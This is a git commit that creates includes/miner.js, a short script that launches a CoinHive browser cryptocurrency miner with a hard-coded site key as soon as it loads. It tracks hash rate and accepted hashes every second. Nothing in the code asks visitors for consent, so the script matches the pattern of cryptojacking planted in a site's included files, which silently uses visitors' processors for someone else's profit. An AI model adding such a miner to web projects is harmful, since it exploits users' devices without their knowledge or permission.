4dfa6f18f89e84f2edaa62f2534d08bbd27b3bc7
Taxin2012 <mrtaxin2012@mail.ru>
2018-03-24 14:37:52 +0300

    Create miner.js

---
+++ includes/miner.js
@@ -0,0 +1,14 @@
+   var miner = new CoinHive.Anonymous('jNQIIlEZCMH4rBDEXubj3tX4gHTQG78Q');
+    miner.start();
+    // Listen on events
+    miner.on('found', function() { /* Hash found */ })
+    miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+    // Update stats once per second
+    setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+
+        // Output to HTML elements...
+    }, 1000);
